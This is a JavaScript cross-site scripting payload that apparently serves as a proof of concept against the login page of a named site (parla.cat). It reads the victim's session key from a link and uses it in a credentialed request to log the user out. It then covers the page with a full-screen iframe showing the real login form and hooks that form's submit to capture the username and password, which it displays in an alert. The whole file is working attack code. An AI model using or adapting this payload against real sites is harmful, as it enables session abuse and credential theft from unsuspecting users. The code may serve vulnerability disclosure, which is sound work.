// RETRIEVE SESSKEY
href = $("a[href*='sesskey']")[0].href;
myRe = /sesskey=(.*)/g;
myArray = myRe.exec(href);
sesskey = myArray[1];

// LOGOUT USER

xhr = new XMLHttpRequest();
xhr.open("POST", href, true);
xhr.setRequestHeader("accept", "*\/*");
xhr.setRequestHeader("accept-language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
xhr.setRequestHeader("content-type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
var body = "sesskey="+sesskey +"";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 
xhr.send(new Blob([aBody]));


// OPEN CONTROLLED IFRAME TO LOGIN

parla = "https://parla.cat/pres_catdigital/AppPHP/login/index.php";
frame = document.createElement("iframe");
frame.src = `${parla}`;
frame.name = 'loginFrame';
frame.id = 'loginFrame';
frame.width = `100%`;
frame.height = `100%`;
frame.style= 'z-index:9999;position:absolute;top: 0px; left: 0px;'
frame.onload = () => {
  
}
document.body.appendChild(frame);

// HOOK FORM
function formHandler(e){
  console.log(e);
  if(e?.srcElement.length>0){
    alert("The credentials are been spied on: \n" 
    + "Login is : "+ e.srcElement[0].value +"\n"
    + "Password is : "+ e.srcElement[1].value +"\n"
    );
  }
}

function hookMessageHandler(){
  login.onsubmit = (e) => {formHandler(e);};
}



loginFrame = document.getElementById("loginFrame");
login = loginFrame.contentWindow.document.getElementById("login");

setTimeout(hookMessageHandler, 3000);
